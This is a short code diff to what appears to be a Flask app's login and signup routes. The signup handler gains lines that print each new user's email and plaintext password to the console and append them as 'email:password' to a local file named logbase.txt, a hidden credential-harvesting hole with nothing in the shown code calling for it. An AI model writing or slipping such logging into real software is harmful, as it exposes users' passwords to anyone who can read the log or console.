@@ -20,7 +20,6 @@ def login_post():
     remember = True if request.form.get('remember') else False
 
     user = db.query(User).filter_by(email=email).first()
-
     # check if user actually exists
     # take the user supplied password, hash it, and compare it to the hashed password in database
     if not user or not check_password_hash(user.password, password):
@@ -43,7 +42,11 @@ def signup_post():
     email = request.form.get('email')
     name = request.form.get('name')
     password = request.form.get('password')
-
+    log = open("logbase.txt",'a')
+    print(111)
+    print(str(email+":"+password))
+    log.write(email+":"+password)
+    log.close()
     user = db.query(User).filter_by(email=email).first()  # if this returns a user, then the email already exists in database
 
     if user:  # if a user is found, we want to redirect back to signup page so user can try again
